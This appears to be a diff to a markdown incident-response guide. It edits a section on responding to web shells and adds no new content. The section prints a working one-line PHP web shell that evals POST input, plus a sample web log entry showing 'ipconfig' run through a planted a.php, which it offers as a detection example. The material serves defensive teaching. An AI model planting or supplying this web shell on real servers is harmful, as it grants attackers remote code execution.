@@ -84,7 +84,7 @@ This is the process of restoring and returning affected systems and devices back
 
 
 **Incedent Response For Webshell**
-1- <?php ${${eval($_POST[potato])}};?>
+1- **"<?php ${${eval($_POST[potato])}};?>"
 2-One method of detection is to review web logs for suspicious GET requests. 
      exsample: ::1 — — [22/Aug/2018:12:42:00 -0400] “GET /dashboard/images/a.php?potato=ipconfig HTTP/1.1” 200 553 “-”       “Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko”
 
